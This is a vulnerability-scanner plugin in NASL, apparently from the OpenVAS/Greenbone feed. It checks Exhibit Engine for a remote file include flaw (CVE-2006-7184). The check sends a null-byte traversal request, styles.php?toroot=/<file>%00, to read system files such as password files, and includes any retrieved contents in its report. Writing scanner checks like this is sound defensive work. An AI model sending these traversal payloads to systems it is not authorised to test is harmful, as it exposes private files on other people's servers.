# SPDX-FileCopyrightText: 2008 Justin Seitz
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80058");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-7184");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/20793");
  script_name("Exhibit Engine toroot Parameter Remote File Include Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2008 Justin Seitz");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one.");

  script_tag(name:"summary", value:"The remote web server running Exhibit Engine, a PHP based photo
  gallery management system which is affected by a remote file include issue.");

  script_tag(name:"insight", value:"The version of Exhibit Engine installed on the remote host fails to
  sanitize input to the 'toroot' parameter before using it in the 'styles.php' script to include PHP code.");

  script_tag(name:"impact", value:"Provided PHP's 'register_globals' setting is enabled, an unauthenticated
  attacker can exploit this issue to view arbitrary files and execute arbitrary code, possibly taken from
  third-party hosts, on the remote host.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port)) exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/gallery", "/photos", "/images", "/exhibit", "/exhibitengine", "/ee", http_cgi_dirs( port:port ) ) ) {

  install = dir;
  if( dir == "/" ) dir = "";

  foreach pattern(keys(files)) {

    file = files[pattern];

    req = http_get(item:string(dir, "/styles.php?toroot=/", file, "%00"),port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (!res) continue;

    if (egrep(pattern:pattern, string:res) ||
      string("main(", file, "\\0styles/original.php): failed to open stream") >< res ||
      string("main(", file, "): failed to open stream: No such file") >< res ||
      "open_basedir restriction in effect. File(" >< res)   {

      passwd = "";
      if (egrep(pattern:pattern, string:res))
        passwd = res;

      if (passwd) {
        info = string("The version of Exhibit Engine installed in directory '", install, "'\n",
          "is vulnerable to this issue. Here are the contents of /" + file + "\n",
          "from the remote host :\n\n", passwd);
      }
      else info = "";

      security_message(data:info, port:port);
      exit(0);
    }
  }
}

exit( 99 );
